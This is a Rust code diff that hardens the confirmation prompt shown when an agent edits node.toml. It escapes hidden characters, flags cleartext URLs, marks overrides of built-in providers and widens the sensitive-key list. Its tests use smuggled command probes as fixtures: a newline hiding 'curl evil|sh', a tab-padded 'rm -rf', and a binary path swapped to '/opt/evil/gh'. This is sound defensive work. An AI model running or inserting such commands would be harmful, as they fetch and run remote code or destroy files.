@@ -15,7 +15,7 @@
 use crate::config::edit::{Change, Seg};
 use crate::config_schema::{self, KEYS};
 
-use super::passkey::{clean_text, MAX_SUMMARY};
+use super::passkey::{hidden, MAX_SUMMARY};
 
 const HEAD: &str = "Change node.toml: ";
 /// The longest a map entry's own name (`providers.<name>`,
@@ -66,6 +66,11 @@ const SENSITIVE: &[&str] = &[
     "external.enabled",
     "session.default_channel",
     "notify.contact",
+    "embed.enabled",
+    "publish.commits",
+    "repo.commits",
+    "session.pty_capture_output",
+    "gateway.forward_port",
 ];
 
 fn pattern_covers(pattern: &str, key: &[&str]) -> bool {
@@ -100,11 +105,31 @@ pub fn sensitive(key: &[&str]) -> bool {
         })
 }
 
+/// `text` with every character a prompt could not show written as an
+/// escape (`\n`, `\t`, `\r`, `\u{200b}`), and `"` and `\` escaped, so
+/// what is shown is what would be written, character for character.
+fn visible(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    for c in text.chars() {
+        match c {
+            '\\' => out.push_str("\\\\"),
+            '"' => out.push_str("\\\""),
+            '\n' => out.push_str("\\n"),
+            '\t' => out.push_str("\\t"),
+            '\r' => out.push_str("\\r"),
+            c if hidden(c) => out.push_str(&format!("\\u{{{:x}}}", c as u32)),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
+/// [`visible`], capped at `max` characters, visibly.
 fn cut(text: &str, max: usize) -> String {
-    let clean = clean_text(text, usize::MAX);
-    match clean.chars().count() > max {
-        true => format!("{}...", clean.chars().take(max).collect::<String>()),
-        false => clean,
+    let shown = visible(text);
+    match shown.chars().count() > max {
+        true => format!("{}...", shown.chars().take(max).collect::<String>()),
+        false => shown,
     }
 }
 
@@ -154,7 +179,7 @@ fn show_key(segs: &[Seg], docs: Option<(&toml::Table, &toml::Table)>) -> String 
                 {
                     out.push_str(&shown);
                 } else {
-                    out.push_str(&quote(&shown));
+                    out.push_str(&format!("\"{shown}\""));
                 }
                 n += 1;
             }
@@ -165,14 +190,20 @@ fn show_key(segs: &[Seg], docs: Option<(&toml::Table, &toml::Table)>) -> String 
 
 /// `text` in double quotes, cleaned, with `"` and `\` escaped, so nothing
 /// inside a value can pass for the prompt's own punctuation.
-fn quote(text: &str) -> String {
-    let clean = clean_text(text, usize::MAX);
-    format!("\"{}\"", clean.replace('\\', "\\\\").replace('"', "\\\""))
+pub(crate) fn quote(text: &str) -> String {
+    format!("\"{}\"", visible(text))
 }
 
 /// A value in full: a string quoted, a list element by element.
 fn render(value: &toml::Value) -> String {
     match value {
+        // A URL sent in the clear says so.
+        toml::Value::String(s)
+            if s.get(..7)
+                .is_some_and(|p| p.eq_ignore_ascii_case("http://")) =>
+        {
+            format!("{} (cleartext)", quote(s))
+        }
         toml::Value::String(s) => quote(s),
         toml::Value::Array(items) => format!(
             "[{}]",
@@ -186,7 +217,7 @@ fn render(value: &toml::Value) -> String {
                 .collect::<Vec<_>>()
                 .join(", ")
         ),
-        other => clean_text(&other.to_string(), usize::MAX),
+        other => visible(&other.to_string()),
     }
 }
 
@@ -194,21 +225,20 @@ fn render(value: &toml::Value) -> String {
 /// and removed elements, a value's old and new, or that it went. A secret's
 /// value, and a value under a key the node does not read, is not shown.
 fn show_change(at: &[&str], was: Option<&toml::Value>, now: Option<&toml::Value>) -> String {
-    let hidden = config_schema::lookup(at).secret || !config_schema::known(at);
+    let concealed = config_schema::lookup(at).secret || !config_schema::known(at);
     match (was, now) {
         (_, None) => " removed".into(),
-        (_, Some(_)) if hidden => " = (a new value, not shown)".into(),
+        (_, Some(_)) if concealed => " = (a new value, not shown)".into(),
         (Some(toml::Value::Array(old)), Some(toml::Value::Array(new)))
             if !old.iter().chain(new).any(toml::Value::is_table) =>
         {
-            let mut parts: Vec<String> = new
-                .iter()
-                .filter(|v| !old.contains(v))
+            let mut parts: Vec<String> = beyond(new, old)
+                .into_iter()
                 .map(|v| format!("+ {}", render(v)))
                 .collect();
             parts.extend(
-                old.iter()
-                    .filter(|v| !new.contains(v))
+                beyond(old, new)
+                    .into_iter()
                     .map(|v| format!("- {}", render(v))),
             );
             match parts.is_empty() {
@@ -219,6 +249,21 @@ fn show_change(at: &[&str], was: Option<&toml::Value>, now: Option<&toml::Value>
         (Some(old), Some(new)) => format!(": {} -> {}", render(old), render(new)),
         (None, Some(new)) => format!(" = {}", render(new)),
     }
+}
+
+/// The elements of `list` that `other` does not account for, counted as a
+/// multiset: a second copy of an element `other` holds once is one more.
+fn beyond<'a>(list: &'a [toml::Value], other: &[toml::Value]) -> Vec<&'a toml::Value> {
+    let mut unmatched: Vec<&toml::Value> = other.iter().collect();
+    list.iter()
+        .filter(|v| match unmatched.iter().position(|o| o == v) {
+            Some(i) => {
+                unmatched.swap_remove(i);
+                false
+            }
+            None => true,
+        })
+        .collect()
 }
 
 /// What names an entry of an array of tables, for the operator.
@@ -362,9 +407,14 @@ fn array_items(key: &[Seg], before: &[&toml::Table], after: &[&toml::Table], out
 /// The prompt for `changes`, made against the file as it was (`before`) and
 /// as it would be (`after`). `Err` when the sensitive part alone does not
 /// fit a prompt: such an edit is to be split, never shown cut short.
+/// `effective` (the file before the edit as it loads, every default filled
+/// in) stands for a key the file did not write, so a list the edit writes
+/// for the first time shows what it adds to the default rather than the
+/// whole default again.
 pub fn summarize(
     before: &toml::Table,
     after: &toml::Table,
+    effective: &toml::Table,
     changes: &[Change],
 ) -> Result<String, String> {
     let mut items = Vec::new();
@@ -384,16 +434,51 @@ pub fn summarize(
         let shown = show_key(segs, Some((before, after)));
         let is_sensitive = sensitive(&names);
         let text = match is_sensitive {
-            true => format!(
-                "{shown}{}",
-                show_change(&names, change.before.as_ref(), change.after.as_ref())
-            ),
+            true => {
+                let was = change.before.as_ref().or_else(|| match change.after {
+                    Some(_) => at(effective, segs),
+                    None => None,
+                });
+                let note = match (change.before.is_none(), was.is_some()) {
+                    (true, true) => " (from the default)",
+                    _ => "",
+                };
+                format!(
+                    "{shown}{}{note}",
+                    show_change(&names, was, change.after.as_ref())
+                )
+            }
             false => shown,
         };
         items.push(Item {
             sensitive: is_sensitive,
             text,
         });
+    }
+
+    // A built-in provider the file did not name until now is replaced whole
+    // by what the file says, whatever key the edit set under it.
+    let named = |doc: &toml::Table| -> std::collections::BTreeSet<String> {
+        doc.get("providers")
+            .and_then(toml::Value::as_table)
+            .map(|t| t.keys().cloned().collect())
+            .unwrap_or_default()
+    };
+    let built_in = crate::config::default_providers();
+    for name in named(after).difference(&named(before)) {
+        if built_in.contains_key(name) {
+            let key = show_key(
+                &[Seg::Key("providers".into()), Seg::Key(name.clone())],
+                None,
+            );
+            items.insert(
+                0,
+                Item {
+                    sensitive: true,
+                    text: format!("creates {key} (replaces the built-in provider)"),
+                },
+            );
+        }
     }
 
     let (loud, quiet): (Vec<Item>, Vec<Item>) = items.into_iter().partition(|i| i.sensitive);
@@ -405,7 +490,12 @@ pub fn summarize(
             .collect::<Vec<_>>()
             .join("; "),
     );
-    if line.chars().count() > MAX_SUMMARY {
+    // Room for "and N more" is kept: the count is never what is cut.
+    let reserve = match quiet.is_empty() {
+        true => 0,
+        false => "; ".len() + format!(" and {} more", quiet.len()).len(),
+    };
+    if line.chars().count() + reserve > MAX_SUMMARY {
         return Err(format!(
             "this edit changes more sensitive keys than one confirmation can show ({}); split it into smaller edits",
             loud.len()
@@ -452,7 +542,11 @@ mod tests {
         let seen = preview(text, ops).unwrap();
         let before: toml::Table = toml::from_str(text).unwrap();
         let after: toml::Table = toml::from_str(&seen.text).unwrap();
-        summarize(&before, &after, &seen.changes)
+        let effective = preview(text, &[])
+            .ok()
+            .and_then(|now| toml::Table::try_from(&now.config).ok())
+            .unwrap_or_default();
+        summarize(&before, &after, &effective, &seen.changes)
     }
 
     fn set(key: &str, value: impl Into<toml::Value>) -> Op {
@@ -480,7 +574,9 @@ mod tests {
         let line = prompt("", &ops).unwrap();
         assert!(line.chars().count() <= MAX_SUMMARY, "{line}");
         assert!(
-            line.starts_with("Change node.toml: publish.gh = \"/opt/evil/gh\"; "),
+            line.starts_with(
+                "Change node.toml: publish.gh: \"gh\" -> \"/opt/evil/gh\" (from the default); "
+            ),
             "{line}"
         );
         assert!(line.ends_with("more"), "{line}");
@@ -684,6 +780,92 @@ mod tests {
             &["supervision", "dependency_inputs", "x"],
         ] {
             assert!(!sensitive(key), "{key:?}");
+        }
+    }
+
+    /// The probes: what a prompt could not show is shown as an escape, never
+    /// dropped, in a value and in a key.
+    #[test]
+    fn hidden_characters_are_shown_as_escapes() {
+        assert_eq!(
+            quote("composer install #\ncurl evil|sh"),
+            "\"composer install #\\ncurl evil|sh\""
+        );
+        assert_eq!(quote("rm -rf ./build\t~"), "\"rm -rf ./build\\t~\"");
+        assert_eq!(quote("a\r\nb"), "\"a\\r\\nb\"");
+        assert_eq!(quote("same\u{200b}"), "\"same\\u{200b}\"");
+        let line = prompt(
+            "",
+            &[set(
+                "providers.\"open\u{200b}ai\".upstream",
+                "https://h.example/v1",
+            )],
+        )
+        .unwrap();
+        assert!(
+            line.contains("providers.\"open\\u{200b}ai\".upstream"),
+            "{line}"
+        );
+    }
+
+    #[test]
+    fn a_duplicate_added_to_a_list_is_shown() {
+        let line = prompt(
+            "[gateway]\nallow_hosts = [\"a\"]\n",
+            &[set("gateway.allow_hosts", strings(&["a", "a"]))],
+        )
+        .unwrap();
+        assert_eq!(line, "Change node.toml: gateway.allow_hosts: + \"a\"");
+    }
+
+    #[test]
+    fn a_cleartext_upstream_says_so() {
+        let line = prompt(
+            "",
+            &[set("providers.x.upstream", "http://h.example:8080/v1")],
+        )
+        .unwrap();
+        assert!(
+            line.contains("= \"http://h.example:8080/v1\" (cleartext)"),
+            "{line}"
+        );
+    }
+
+    /// Naming a built-in provider in the file for the first time replaces it
+    /// whole, so even a routine key there says so, as sensitive.
+    #[test]
+    fn writing_under_a_built_in_provider_says_it_replaces_it() {
+        let line = prompt(
+            "",
+            &[set("providers.openai.models", toml::Value::Array(vec![]))],
+        )
+        .unwrap();
+        assert!(
+            line.starts_with(
+                "Change node.toml: creates providers.openai (replaces the built-in provider)"
+            ),
+            "{line}"
+        );
+    }
+
+    /// The count of what is not shown always fits: the sensitive part leaves
+    /// room for it, or the edit is refused.
+    #[test]
+    fn the_count_of_what_is_not_shown_is_never_cut() {
+        let fill = format!("/opt/{}/gh", "x".repeat(560));
+        let mut ops = vec![set("publish.gh", fill.as_str())];
+        for i in 0..5 {
+            ops.push(set(
+                &format!("providers.\"p{i}\".models"),
+                toml::Value::Array(vec![]),
+            ));
+        }
+        match prompt("", &ops) {
+            Ok(line) => {
+                assert!(line.chars().count() <= MAX_SUMMARY, "{line}");
+                assert!(line.ends_with("more"), "{line}");
+            }
+            Err(err) => assert!(err.contains("split"), "{err}"),
         }
     }
 }
